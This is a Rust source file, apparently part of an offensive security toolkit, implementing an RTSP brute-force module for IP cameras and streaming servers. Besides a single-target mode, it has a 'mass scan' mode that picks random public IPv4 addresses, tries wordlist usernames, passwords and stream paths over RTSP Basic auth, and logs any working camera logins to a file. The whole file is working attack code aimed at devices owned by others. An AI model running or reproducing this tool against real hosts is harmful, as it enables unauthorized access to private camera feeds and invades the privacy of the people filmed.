use anyhow::{anyhow, Result, Context};
use base64::engine::general_purpose::STANDARD as Base64;
use base64::Engine as _;
use colored::*;
use futures::stream::{FuturesUnordered, StreamExt};
use std::{
    fs::File,
    io::Write,
    net::{IpAddr, Ipv4Addr, SocketAddr},
    sync::Arc,
    sync::atomic::{AtomicBool, AtomicUsize, Ordering},
    time::Duration,
};
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    sync::{Mutex, Semaphore},
    time::{sleep, timeout},
    process::Command,
    fs::OpenOptions,
};
use rand::Rng;

use crate::utils::{
    prompt_yes_no, prompt_wordlist, prompt_default, prompt_int_range, prompt_port,
    load_lines, get_filename_in_current_dir, normalize_target,
};
use crate::modules::creds::utils::BruteforceStats;

const PROGRESS_INTERVAL_SECS: u64 = 2;
const MASS_SCAN_CONNECT_TIMEOUT_MS: u64 = 3000;
const STATE_FILE: &str = "rtsp_hose_state.log";

// Hardcoded exclusions (Private + Cloudflare + Google + Link Local etc) - Copied from telnet_hose
const EXCLUDED_RANGES: &[&str] = &[
    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", // Private
    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8", // Multicast/Reserved
    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32", // Carrier/LinkLocal/Broadcast
    // Cloudflare
    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13", 
    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18", 
    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20", 
    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
    "1.1.1.1/32", "1.0.0.1/32",
    // Google
    "8.8.8.8/32", "8.8.4.4/32"
];

fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   Advanced RTSP Brute Force Module                        ║".cyan());
    println!("{}", "║   IP Camera and Streaming Server Credential Testing       ║".cyan());
    println!("{}", "║   Supports path enumeration and custom headers            ║".cyan());
    println!("{}", "║   Modes: Single Target & Mass Scan (Hose)                 ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
    println!();
}

/// Main entry point for the advanced RTSP brute force module.
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    // Check for Mass Scan Mode conditions
    // If target is "random", "0.0.0.0", "0.0.0.0/0", or looks like a file path (and we can assume it's a file list)
    // Note: The caller usually handles file loading for specific modules, but for "hose" modules like telnet_hose, passing the file path is common.
    // We'll treat it as mass scan if it's explicitly "random" OR "0.0.0.0" OR if it points to an existing file.
    // Simple heuristic: if we can open it as a file, treat as file list for mass scan.
    let is_mass_scan = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0" || std::path::Path::new(target).is_file();

    println!("{}", format!("[*] Target: {}", target).cyan());
    if is_mass_scan {
        println!("{}", "[*] Mode: Mass Scan / Hose".yellow());
        return run_mass_scan(target).await;
    }

    // --- Standard Single-Target Logic ---

    let port: u16 = prompt_port("RTSP Port", 554).await?;

    let usernames_file = prompt_wordlist("Username wordlist").await?;
    let passwords_file = prompt_wordlist("Password wordlist").await?;

    let concurrency = prompt_int_range("Max concurrent tasks", 10, 1, 10000).await? as usize;

    let stop_on_success = prompt_yes_no("Stop on first success?", true).await?;
    let _save_results = prompt_yes_no("Save results to file?", true).await?;
    let save_path = if _save_results {
        Some(prompt_default("Output file", "rtsp_results.txt").await?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false).await?;
    let combo_mode = prompt_yes_no("Combination mode? (try every pass with every user)", false).await?;

    let advanced_mode = prompt_yes_no("Use advanced RTSP commands/headers (DESCRIBE + custom headers)?", false).await?;
    let mut advanced_headers: Vec<String> = Vec::new();
    let advanced_command = if advanced_mode {
        let method = prompt_default("RTSP method to use (e.g. DESCRIBE)", "DESCRIBE").await?;
        if prompt_yes_no("Load extra RTSP headers from a file?", false).await? {
            let headers_path = prompt_wordlist("Path to RTSP headers file").await?;
            advanced_headers = load_lines(&headers_path)?;
        }
        Some(method)
    } else {
        None
    };
    let advanced_headers = Arc::new(advanced_headers);

    // Extract RTSP path if present (e.g., rtsp://host:port/path -> path)
    let implicit_path = extract_rtsp_path(target);
    
    // Normalize target and add port if needed
    let target_normalized = if target.starts_with("rtsp://") {
        target.strip_prefix("rtsp://")
            .unwrap()
            .split('/')
            .next()
            .unwrap_or(target)
    } else {
        target.split('/').next().unwrap_or(target)
    };
    
    let normalized = normalize_target(target_normalized)?;
    let addr = if normalized.contains(':') {
        normalized
    } else {
        format!("{}:{}", normalized, port)
    };
    let found = Arc::new(Mutex::new(Vec::new()));
    let stop = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(BruteforceStats::new()); // Standardized stats
    let semaphore = Arc::new(Semaphore::new(concurrency));

    println!("\n[*] Starting brute-force on {}", addr);

    let resolved_addrs = match resolve_targets(&addr).await {
        Ok(addrs) => Arc::new(addrs),
        Err(e) => {
            eprintln!("[!] Failed to resolve '{}': {}", addr, e);
            return Err(e);
        }
    };

    let users = load_lines(&usernames_file)?;
    if users.is_empty() {
        println!("[!] Username wordlist is empty. Exiting.");
        return Ok(());
    }

    let pass_lines = load_lines(&passwords_file)?;
    if pass_lines.is_empty() {
        println!("[!] Password wordlist is empty. Exiting.");
        return Ok(());
    }

    let brute_force_paths = prompt_yes_no("Brute force possible RTSP paths (e.g. /stream /live)?", false).await?;
    let mut paths = if brute_force_paths {
        let paths_file = prompt_wordlist("Path to RTSP paths file").await?;
        load_lines(&paths_file)?
    } else {
        vec!["".to_string()]
    };
    if paths.is_empty() {
        println!("[!] RTSP paths list is empty. Falling back to default root path.");
        paths.push(String::new());
    }
    if let Some(p) = implicit_path {
        if !paths.iter().any(|existing| existing == &p) {
            paths.insert(0, p);
        }
    }
    println!();

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop.clone();
    let progress_handle = tokio::spawn(async move {
        loop {
            if stop_clone.load(Ordering::Relaxed) {
                break;
            }
            stats_clone.print_progress();
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });

    let mut tasks = FuturesUnordered::new();
    let mut idx = 0usize;

    for pass in pass_lines {
        if stop_on_success && stop.load(Ordering::Relaxed) { break; }

        let userlist: Vec<String> = if combo_mode {
            users.clone()
        } else {
            vec![users.get(idx % users.len()).unwrap_or(&users[0]).to_string()]
        };

        for user in userlist {
            if stop_on_success && stop.load(Ordering::Relaxed) { break; }
            for path in &paths {
                if stop_on_success && stop.load(Ordering::Relaxed) { break; }

                let addr_clone = addr.clone();
                let user_clone = user.clone();
                let pass_clone = pass.clone();
                let path_clone = path.clone();
                let found_clone = Arc::clone(&found);
                let stop_clone = Arc::clone(&stop);
                let stats_clone = Arc::clone(&stats);
                let command = advanced_command.clone();
                let headers = Arc::clone(&advanced_headers);
                let semaphore_clone = Arc::clone(&semaphore);
                let addrs_clone = Arc::clone(&resolved_addrs);
                let stop_flag = stop_on_success;
                let verbose_flag = verbose;

                tasks.push(tokio::spawn(async move {
                    if stop_flag && stop_clone.load(Ordering::Relaxed) { return; }
                    let permit = match semaphore_clone.acquire_owned().await {
                        Ok(permit) => permit,
                        Err(_) => return,
                    };
                    if stop_flag && stop_clone.load(Ordering::Relaxed) { 
                        drop(permit);
                        return; 
                    }

                    match try_rtsp_login(
                        addrs_clone.as_slice(),
                        &addr_clone,
                        &user_clone,
                        &pass_clone,
                        &path_clone,
                        command.as_deref(),
                        &headers,
                    ).await {
                        Ok(true) => {
                            let path_str = if path_clone.is_empty() { "NO_PATH" } else { &path_clone };
                            println!("\r{}", format!("[+] {} -> {}:{} [path={}]", addr_clone, user_clone, pass_clone, path_str).green().bold());
                            found_clone.lock().await.push((addr_clone.clone(), user_clone.clone(), pass_clone.clone(), path_str.to_string()));
                            stats_clone.record_success();
                            if stop_flag {
                                stop_clone.store(true, Ordering::Relaxed);
                            }
                        }
                        Ok(false) => {
                            stats_clone.record_failure();
                            if verbose_flag {
                                println!("\r{}", format!("[-] {} -> {}:{} [path={}]", addr_clone, user_clone, pass_clone, path_clone).dimmed());
                            }
                        }
                        Err(e) => {
                            stats_clone.record_error(e.to_string()).await;
                            if verbose_flag {
                                println!("\r{}", format!("[!] {} -> error: {}", addr_clone, e).red());
                            }
                        }
                    }

                    drop(permit);
                    sleep(Duration::from_millis(10)).await;
                }));
            }
        }
        idx += 1;
    }

    while let Some(res) = tasks.next().await {
        if let Err(e) = res {
            if verbose {
               stats.record_error(format!("Task panic: {}", e)).await;
            }
        }
    }

    // Stop progress reporter
    stop.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    // Print final statistics
    stats.print_final().await;

    let creds = found.lock().await;
    if creds.is_empty() {
        println!("{}", "[-] No credentials found (with these paths).".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
        for (host, user, pass, path) in creds.iter() {
            println!("    {} -> {}:{} [path={}]", host, user, pass, path);
        }

        if let Some(path) = save_path {
            let filename = get_filename_in_current_dir(&path);
            if let Ok(mut file) = File::create(&filename) {
                for (host, user, pass, path) in creds.iter() {
                    let _ = writeln!(file, "{} -> {}:{} [path={}]", host, user, pass, path);
                }
                println!("[+] Results saved to '{}'", filename.display());
            }
        }
    }

    Ok(())
}

/// Run mass scan logic (Hose style)
async fn run_mass_scan(target: &str) -> Result<()> {
    // Prep wordlists
    println!("{}", "[*] Preparing Mass Scan configuration...".blue());
    
    let port: u16 = prompt_port("RTSP Port", 554).await?;
    
    let usernames_file = prompt_wordlist("Username wordlist").await?;
    let passwords_file = prompt_wordlist("Password wordlist").await?;
    let paths_file = prompt_wordlist("RTSP paths file (empty for none/root)").await?;
    
    let users = load_lines(&usernames_file)?;
    let pass_lines = load_lines(&passwords_file)?;
    let mut paths = load_lines(&paths_file)?;
    if paths.is_empty() {
         paths.push("".to_string());
    }

    if users.is_empty() || pass_lines.is_empty() {
        return Err(anyhow!("Wordlists cannot be empty"));
    }

    let concurrency = prompt_int_range("Max concurrent hosts to scan", 500, 1, 10000).await? as usize;
    let verbose = prompt_yes_no("Verbose mode?", false).await?;

    let output_file = prompt_default("Output result file", "rtsp_mass_results.txt").await?;

    // Parse exclusions
    let mut exclusion_subnets = Vec::new();
    for cidr in EXCLUDED_RANGES {
        if let Ok(net) = cidr.parse::<ipnetwork::IpNetwork>() {
            exclusion_subnets.push(net);
        }
    }
    let exclusions = Arc::new(exclusion_subnets);

    // Shared State
    let semaphore = Arc::new(Semaphore::new(concurrency));
    let stats_checked = Arc::new(AtomicUsize::new(0));
    let stats_found = Arc::new(AtomicUsize::new(0));
    
    let creds_pkg = Arc::new((users, pass_lines, paths));

    // Stats Reporter
    let s_checked = stats_checked.clone();
    let s_found = stats_found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(5)).await;
            println!(
                "[*] Status: {} IPs scanned, {} RTSP streams found",
                s_checked.load(Ordering::Relaxed),
                s_found.load(Ordering::Relaxed).to_string().green().bold()
            );
        }
    });

    let run_random = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0";

    if run_random {
        println!("{}", "[*] Starting Random Internet Scan...".green());
        loop {
             let permit = semaphore.clone().acquire_owned().await.unwrap();
             let exc = exclusions.clone();
             let cp = creds_pkg.clone();
             let sc = stats_checked.clone();
             let sf = stats_found.clone();
             let of = output_file.clone();
             
             tokio::spawn(async move {
                 let ip = generate_random_public_ip(&exc);
                 
                 // Deduplication check
                 if !is_ip_checked(&ip).await {
                     mark_ip_checked(&ip).await;
                     mass_scan_host(ip, port, cp, sf, of, verbose).await;
                 }
                 
                 sc.fetch_add(1, Ordering::Relaxed);
                 drop(permit);
             });
        }
    } else {
        // File Mode
        let content = tokio::fs::read_to_string(target).await.unwrap_or_default();
        let lines: Vec<String> = content.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
        println!("{}", format!("[*] Loaded {} targets from file.", lines.len()).blue());

        for ip_str in lines {
             let permit = semaphore.clone().acquire_owned().await.unwrap();
             let cp = creds_pkg.clone();
             let sc = stats_checked.clone();
             let sf = stats_found.clone();
             let of = output_file.clone();
             
             // Try parse IP, or resolve? For mass scan usually IP lists. We'll try resolve if parsing fails.
             // But to keep it simple and aligned with "hose" logic which normally takes IPs:
             let ip_addr = match ip_str.parse::<IpAddr>() {
                 Ok(ip) => Some(ip),
                 Err(_) => {
                     // Try resolve
                     match tokio::net::lookup_host(format!("{}:{}", ip_str, port)).await {
                         Ok(mut iter) => iter.next().map(|s| s.ip()),
                         Err(_) => None
                     }
                 }
             };

             tokio::spawn(async move {
                 if let Some(ip) = ip_addr {
                    if !is_ip_checked(&ip).await {
                        mark_ip_checked(&ip).await;
                        mass_scan_host(ip, port, cp, sf, of, verbose).await;
                    }
                 }
                 sc.fetch_add(1, Ordering::Relaxed);
                 drop(permit);
             });
        }
        
        // Wait for finish
        for _ in 0..concurrency {
            let _ = semaphore.acquire().await.context("Semaphore acquisition failed")?;
        }
    }

    Ok(())
}

async fn mass_scan_host(
    ip: IpAddr, 
    port: u16, 
    creds: Arc<(Vec<String>, Vec<String>, Vec<String>)>, 
    stats_found: Arc<AtomicUsize>,
    output_file: String,
    verbose: bool
) {
    let sa = SocketAddr::new(ip, port);
    
    // 1. Connection Check (Fast Fail)
    if timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), TcpStream::connect(&sa)).await.is_err() {
        return;
    }
    
    // 2. Bruteforce
    let (users, passes, paths) = &*creds;
    
    // Helper to cleanup repetitive calls
    // We iterate: Path -> User -> Pass ? Or User -> Pass -> Path?
    // RTSP paths are important. Often root works.
    
    for path in paths {
        for user in users {
            for pass in passes {
                // We use the existing try_rtsp_login. 
                // It does re-connect, which is not optimal but robust.
                let addrs = [sa];
                let empty_headers: Vec<String> = Vec::new();
                
                // For mass scan, we assume standard DESCRIBE or OPTIONS is fine.
                // try_rtsp_login defaults to OPTIONS if None, let's use DESCRIBE if we want to check stream?
                // Actually existing tool defaults to OPTIONS unless advanced is on. OPTIONS is auth-less often?
                // No, OPTIONS usually requires auth if server is secure.
                
                let res = try_rtsp_login(
                    &addrs, 
                    &sa.to_string(), 
                    user, 
                    pass, 
                    path, 
                    Some("DESCRIBE"), // Use DESCRIBE to be sure we can access stream info
                    &empty_headers
                ).await;

                match res {
                   Ok(true) => {
                       // Success!
                       let result_str = format!("{} -> {}:{} [path={}]", sa, user, pass, path);
                       println!("\r{}", format!("[+] FOUND: {}", result_str).green().bold());
                       
                       // Save
                       if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(&output_file).await {
                           let _ = file.write_all(format!("{}\n", result_str).as_bytes()).await;
                       }
                       
                       stats_found.fetch_add(1, Ordering::Relaxed);
                       return; // Stop scanning this host on found
                   }
                   Ok(false) => {
                       // Auth failure
                   }
                   Err(e) => {
                       // Connection error or protocol error
                       if verbose {
                            // Only print verbose errors if really needed, prevents spam
                       }
                       // If connection failed (rst/timeout), often no point trying other creds?
                       // But existing function returns Err on IO error.
                       // We should probably stop trying this host if we get Refused/Timeout inside loop?
                       let err_str = e.to_string().to_lowercase();
                       if err_str.contains("refused") || err_str.contains("timeout") || err_str.contains("reset") {
                           return; // Host dead or blocking us
                       }
                   }
                }
                // Small sleep to be polite?
                // sleep(Duration::from_millis(50)).await; 
            }
        }
    }
}


fn generate_random_public_ip(exclusions: &[ipnetwork::IpNetwork]) -> IpAddr {
    let mut rng = rand::rng();
    loop {
        let octets: [u8; 4] = rng.random();
        let ip = Ipv4Addr::from(octets);
        let ip_addr = IpAddr::V4(ip);
        
        let mut excluded = false;
        for net in exclusions {
            if net.contains(ip_addr) {
                excluded = true;
                break;
            }
        }
        
        if !excluded {
            return ip_addr;
        }
    }
}

async fn is_ip_checked(ip: &impl ToString) -> bool {
    // Ensure state file exists before running grep
    if !std::path::Path::new(STATE_FILE).exists() {
        // Create empty state file to avoid grep errors
        if let Ok(mut file) = OpenOptions::new()
            .create(true)
            .write(true)
            .open(STATE_FILE)
            .await
        {
            let _ = file.flush().await;
        }
        return false; // File was just created, IP definitely not checked
    }

    let ip_s = ip.to_string();
    let status = Command::new("grep")
        .arg("-F")
        .arg("-q")
        .arg(format!("checked: {}", ip_s))
        .arg(STATE_FILE)
        .status()
        .await;
    
    match status {
        Ok(s) => s.success(), 
        Err(_) => false, 
    }
}

async fn mark_ip_checked(ip: &impl ToString) {
    let data = format!("checked: {}\n", ip.to_string());
    if let Ok(mut file) = OpenOptions::new()
        .create(true)
        .append(true)
        .open(STATE_FILE)
        .await 
    {
        let _ = file.write_all(data.as_bytes()).await;
    }
}

/// Resolve a host:port (literal v4/v6 or DNS) into all possible SocketAddrs.
async fn resolve_targets(addr: &str) -> Result<Vec<SocketAddr>> {
    // 1) If it's a literal SocketAddr, return it directly
    if let Ok(sa) = addr.parse::<SocketAddr>() {
        return Ok(vec![sa]);
    }

    // 2) Split into host / port
    let (host, port) = if let Some((h, p)) = addr.rsplit_once(':') {
        (h.to_string(), p.parse().unwrap_or(554))
    } else {
        (addr.to_string(), 554)
    };

    // 3) Clean any nested brackets and format bracketed IPv6 or plain host
    let host_clean = host.trim_matches(|c| c == '[' || c == ']').to_string();
    let host_port = if host_clean.contains(':') {
        format!("[{}]:{}", host_clean, port)
    } else {
        format!("{}:{}", host_clean, port)
    };

    // 4) DNS lookup (handles A + AAAA)
    let addrs = tokio::net::lookup_host(host_port.clone())
        .await
        .map_err(|e| anyhow!("DNS lookup '{}': {}", host_port, e))?
        .collect::<Vec<_>>();

    if addrs.is_empty() {
        Err(anyhow!("No addresses found for '{}'", host_port))
    } else {
        Ok(addrs)
    }
}

/// Attempt RTSP login, trying each resolved address until one succeeds or all fail.
async fn try_rtsp_login(
    addrs: &[SocketAddr],
    addr_display: &str,
    user: &str,
    pass: &str,
    path: &str,
    method: Option<&str>,
    extra_headers: &[String],
) -> Result<bool> {
    let mut last_err = None;
    let mut stream = None;
    let mut connected_sa: Option<SocketAddr> = None;

    // Try each candidate address
    for sa in addrs {
        match timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), TcpStream::connect(*sa)).await {
            Ok(Ok(s)) => {
                stream = Some(s);
                connected_sa = Some(*sa);
                break;
            }
            Ok(Err(e)) => {
                last_err = Some(e);
                continue;
            }
            Err(_) => {
                 last_err = Some(std::io::Error::new(std::io::ErrorKind::TimedOut, "Connect timeout"));
                 continue;
            }
        }
    }

    // Unwrap the successful connection and SocketAddr
    let (mut stream, sa) = match (stream, connected_sa) {
        (Some(s), Some(sa)) => (s, sa),
        _ => {
            return Err(anyhow!(
                "All connection attempts to {} failed: {}",
                addr_display,
                last_err.map(|e| e.to_string()).unwrap_or_default()
            ))
        }
    };

    // Build a proper host:port string for the RTSP URI, handling IPv6 correctly
    let ip_str = sa.ip().to_string();
    let host_for_uri = if ip_str.contains(':') {
        format!("[{}]:{}", ip_str, sa.port())
    } else {
        format!("{}:{}", ip_str, sa.port())
    };

    let rtsp_method = method.unwrap_or("OPTIONS");
    let path_str = if path.is_empty() { "" } else { path };
    let credentials = Base64.encode(format!("{}:{}", user, pass));

    let mut request = format!(
        "{method} rtsp://{host}/{path} RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {auth}\r\n",
        method = rtsp_method,
        host = host_for_uri,
        path = path_str.trim_start_matches('/'),
        auth = credentials,
    );

    for header in extra_headers {
        request.push_str(header);
        if !header.ends_with("\r\n") {
            request.push_str("\r\n");
        }
    }
    request.push_str("\r\n");

    stream.write_all(request.as_bytes()).await?;
    let mut buffer = [0u8; 2048];
    // Add Read timeout
    let n = match timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), stream.read(&mut buffer)).await {
        Ok(Ok(n)) => n,
        Ok(Err(e)) => return Err(e.into()),
        Err(_) => return Err(anyhow!("Read timeout")),
    };
    
    if n == 0 {
        return Err(anyhow!("{}: server closed connection unexpectedly.", addr_display));
    }
    let response = String::from_utf8_lossy(&buffer[..n]);

    if response.contains("200 OK") {
        Ok(true)
    } else if response.contains("401") || response.contains("403") {
        Ok(false)
    } else {
        // Some cameras might return 404 if path is wrong but still authorized? 
        // Or 400 Bad Request?
        // Safest is to treat anything not 200 as fail, but maybe check for specifc auth fail codes.
        // If we get 404, the creds might be valid but path invalid. 
        // But without positive valid signal, we assume fail.
        Err(anyhow!("{}: unexpected RTSP response: {}", addr_display, response.lines().next().unwrap_or("")))
    }
}

/// Extract RTSP path from target string (e.g., rtsp://host:port/path -> Some("/path"))
/// Returns None if no path is present or if path is just "/"
fn extract_rtsp_path(target: &str) -> Option<String> {
    let trimmed = target.trim();
    
    // Remove rtsp:// scheme if present
    let without_scheme = trimmed.strip_prefix("rtsp://").unwrap_or(trimmed);
    
    // Split on first '/' to separate host:port from path
    if let Some((_, path)) = without_scheme.split_once('/') {
        // Remove query strings and fragments
        let clean_path = path.split(|c| c == '?' || c == '#')
            .next()
            .unwrap_or_default()
            .trim();
        
        if clean_path.is_empty() || clean_path == "/" {
            None
        } else {
            // Ensure path starts with '/'
            let mut final_path = clean_path.to_string();
            if !final_path.starts_with('/') {
                final_path.insert(0, '/');
            }
            Some(final_path)
        }
    } else {
        None
    }
}
